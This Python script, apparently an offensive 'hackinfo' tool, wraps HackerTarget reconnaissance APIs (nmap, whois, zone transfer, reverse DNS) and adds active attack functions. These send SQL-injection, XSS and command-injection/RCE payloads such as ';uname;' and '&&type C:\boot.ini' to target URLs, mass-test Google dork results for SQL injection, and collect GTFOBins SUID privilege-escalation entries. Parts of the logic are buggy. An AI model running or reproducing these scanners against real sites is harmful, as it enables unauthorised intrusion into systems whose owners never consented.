#!/usr/bin/python
# -*- coding: utf-8 -*-
from termcolor import colored
import requests
import re 
import sys
import socket
import time
from bs4 import BeautifulSoup
from prettytable import PrettyTable
from googlesearch import search
import os
""" Hackinfo web application """
def write(M):
        for c in M + '\n':
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(2. / 100)

class hackinfo():
        "web application Hejab Zaeri"
        global HackerScan
        HackerScan={
        "ping":"https://api.hackertarget.com/nping/?q=",
        "trcrouter":"https://api.hackertarget.com/mtr/?q=",
        "reversedns":"https://api.hackertarget.com/reversedns/?q=",
        "geoip":"https://api.hackertarget.com/geoip/?q=",
        "reverseiplookup":"https://api.hackertarget.com/reverseiplookup/?q=",
        "whois":"https://api.hackertarget.com/whois/?q=",
        "zonetransfer":"https://api.hackertarget.com/zonetransfer/?q=",
        "findshareddns":"https://api.hackertarget.com/findshareddns/?q=",
        "hostsearch":"https://api.hackertarget.com/hostsearch/?q=",
        "nmap":"https://api.hackertarget.com/nmap/?q=",
        "pagelinks":"https://api.hackertarget.com/pagelinks/?q=",
        "httpheaders":"https://api.hackertarget.com/httpheaders/?q=",
        "subnetcalc":"https://api.hackertarget.com/subnetcalc/?q=",
        "dnslookup":"https://api.hackertarget.com/dnslookup/?q="
        }
        def nmap (Target):
                Scan = HackerScan['nmap']
                write("[+] <-- Running Nmap....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))

        def ping(Target):
                Scan = HackerScan['ping']
                write("[+] <-- Running Ping....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def trcrouter(Target):
                Scan = HackerScan['trcrouter']
                write("[+] <-- Running Trcrouter ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def reversedns (Target):
                Scan = HackerScan['reversedns']
                write("[+] <-- Running Reversedns ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        elif re.findall("error input is invalid",url):
                                ip = socket.gethostbyname(Target)
                                requests_url = Scan + ip
                                for url_ip in requests.get(requests_url).text.split("\n"):
                                        print(colored(url_ip,"green"))
                        else:
                                print(colored(url.strip(),"green"))
        def geoip(Target):
                Scan = HackerScan['geoip']
                write("[+] <-- Running Geoip ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def reverseiplookup (Target):
                Scan = HackerScan['reverseiplookup']
                write("[+] <-- Running Reverseiplookup ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def whois (Target):
                Scan = HackerScan['whois']
                write("[+] <-- Running Whois ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def zonetransfer (Target):
                Scan = HackerScan['zonetransfer']
                write("[+] <-- Running Zonetransfer ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def findshareddns(Target):

                Scan = HackerScan['findshareddns']
                write("[+] <-- Running Findshareddns ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def hostsearch(Target):
                Scan = HackerScan['hostsearch']
                write("[+] <-- Running HostSearch ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def pagelinks(Target):
                Scan = HackerScan['pagelinks']
                write("[+] <-- Running Pagelinks ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def httpheaders(Target):
                Scan = HackerScan['httpheaders']
                write("[+] <-- Running HttpHeaders ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def subnetcalc(Target):
                Scan = HackerScan['subnetcalc']
                write("[+] <-- Running Subnetcalc ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def dnslookup(Target):
                Scan = HackerScan['dnslookup']
                write("[+] <-- Running Dnslookup ....[{}] -->".format(Target))
                sys.stdout.flush()
                requests_url = Scan + Target
                requests_url = requests.get(requests_url)
                for url in requests_url.text.split("\n"):
                        if re.findall("error check your api query",url):
                                print(colored("[-] Error Chack ","red"))
                        else:
                                print(colored(url.strip(),"green"))
        def Dork_scan_sql(Target,cout):
                for i in search(Target,stop=int(cout)):
                        print(i)
                        pa = ["'","2%5c","2'><","%52%4c%49%4b%45%25%32%30%28%53%45%4c%45%43%54%25%32%30%28%43%41%53%45%25%32%30%57%48%45%4e%25%32%30%28%34%33%34%36%3d%34%33%34%37%29%25%32%30%54%48%45%4e%25%32%30%30%78%36%31%36%34%36%64%36%39%36%65%25%32%30%45%4c%53%45%25%32%30%30%78%32%38%25%32%30%45%4e%44%29%29%25%32%30%41%4e%44%25%32%30%25%32%37%68%65%6a%61%62%25%32%37%3d%25%32%37"]
                        for sql_chack in pa :         
                                h = requests.get(i+sql_chack) 
                        soup = BeautifulSoup(h.content,'html.parser') 
                        if len(soup.find_all(text=re.compile("SQL syntax|Microsoft.+Database|Incorrect syntax|unterminated.+qoute"))) >0:
                                
                             print(colored("[SQL Found]=="+i,"green")) 
                             open("SQL-injection","a").write("[SQL Found]=="+i+"\n")
                        elif len(soup.find_all(text=re.compile("Warning"))) >0:
                             print(colored("[SQL Found]=="+i,"green")) 
                             open("SQL-injection.txt","a").write("[SQL Found]=="+i+"\n")
                        else:
                                print(colored("[No SQL Found ]","red"))
        def Sql_chack(Target):
                pa = ["'","2%5c","2'><","2%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27","%22"]
                if "?" in Target:

                        write(colored(f"[Scanning SQl Target {Target} ]","red"))
                        for sql_chack in pa :
                                 h = requests.get(Target+sql_chack)
                                 soup = BeautifulSoup(h.content,'html.parser')
                                 if len(soup.find_all(text=re.compile("SQL syntax|Microsoft.+Database|Incorrect syntax|unterminated.+qoute"))) >0:
                                         print(colored("[SQL Found]=="+h.url,"green"))
                                         open("SQL-injection","a").write("[SQL Found]=="+Target+"\n")
                                         
                                 else :
                                         print(colored("[No SQL Found ]","red"))
                else :
                        print(colored("[Write Url http://Target.com/index.php?id=value ]","red"))

        def XSS_Chack (Target):

                pa = ["<script>alert('hejab')</script>",
"<scr<script>ipt>alert('hejab')</scr<script>ipt>",
"><script>alert('hejab')</script>",
"><script>alert(String.fromCharCode(88,83,83))</script>",
"<img src=x onerror=alert('hejab');>",
"<img src=x onerror=alert('hejab')//",
"<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
"<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
"<img src=x:alert(alt) onerror=eval(src) alt=xss>",
"><img src=x onerror=alert('hejab');>",
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
"#'><img src=/ onerror=alert('hejab')>"]
                if "?" in Target :
                        write(colored("[Scanning XSS Target ]","red"))

                        for xss_chack in pa :
                                 h = requests.get(Target+xss_chack)
                                 soup = BeautifulSoup(h.content,'html.parser')
                                 if len(soup.find_all(text=re.compile("hejab"))) >0:
                                         print(colored("[XSS Found]=="+h.url,"green"))
                                         open("XSS-injection","a").write("[XSS Found]=="+Target+"\n")
                                         
                                 else :
                                         print(colored("[No XSS Found ]","red"))
                else :
                        print(colored("[Write Url http://Target.com/index.php?id=value ]","red"))

        def Rce_Chack(Target):
                # RCE Write Zigoo0 https://github.com/zigoo0/webpwn3r/blob/3fb27bb605212fb419930d441a6d5c8fde0ed6be/vulnz.py#L49  
                pa = [';${@print(md5(hejab))}', ';${@print(md5("hejab"))}']
                pa += ['%253B%2524%257B%2540print%2528md5%2528%2522hejab%2522%2529%2529%257D%253B']               
                pa += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
                if "?" in Target :
                        write(colored("[Scanning Rce Target ]","red"))
                        for rce_chack in pa :

                                h = requests.get(Target+rce_chack)
                                soup = BeautifulSoup(h.content,'html.parser')
                                if len(soup.find_all(text=re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I))) >0:

                                        print(colored("[Rce Found]=="+h.url,"green"))
                                        open("Rce-injection","a").write("[Rce Found]=="+Target+"\n")
                                        exit()
                                else :
                                         print(colored("[No Rce Found ]","red"))
                else :
                        print(colored("[Write Url http://Target.com/index.php?id=value ]","red"))




                
                

        def domain_filter (domain,file):
               write("[+] <-- Running Domain_filter_File ....-->")
               write("[+] <-- Searching  [{}] Files [{}] ....-->".format(domain,file))
               html = requests.get("https://www.google.com/search?num=500&q=site:"+domain+"+filetype:"+file)
               if html.status_code == 200:
                       data = re.sub('<b>', '', str(html.content))
                       r = re.compile('[-_.a-zA-Z0-9.-_]*' + '\.' + file)  
                       response = r.findall(data)
                       for i in response :
                               i.rstrip("\n")
                               output = str(colored(i.replace("/url?q=",''),"green"))
                               print(output) 
                       print("#####################[Finshid]########################")

               elif html.status_code == 302:
                       print("Your Returned "+html.status_code+"Reason"+html.reason)
               else:
                       print("Your Returned "+html.status_code+"Reason"+html.reason)

        def suid_exploit (command):
                try :
                        os.mkdir("file_exploit") # mkdir Dir 
                except :
                        pass
                os.chdir("file_exploit")
                file_save = os.getcwd()

                Table = PrettyTable([colored('SUID Exploit' ,'red', attrs=['bold']),"File name"])#,"File name"

                command = re.split(",",command) # filter string list 
                try:

                        for COM in command:  
                                http = requests.get(f"https://gtfobins.github.io/gtfobins/{COM}/")
                                soup = BeautifulSoup(http.content,'html.parser')
                                if http.status_code == 200:                                
                                        for i in soup.find_all("ul",{"class":"examples"}):
                                                with open(f"{COM}.txt","a") as file:
                                                        
                                                        file.write(i.text)
                                        Table.add_row([http.url,file_save+'/'+file.name])#file.name

                                else :
                                        
                                        pass
                        print(Table.get_string(title=colored("Exploit Gtfobins","red")))
                except:
                        pass
        
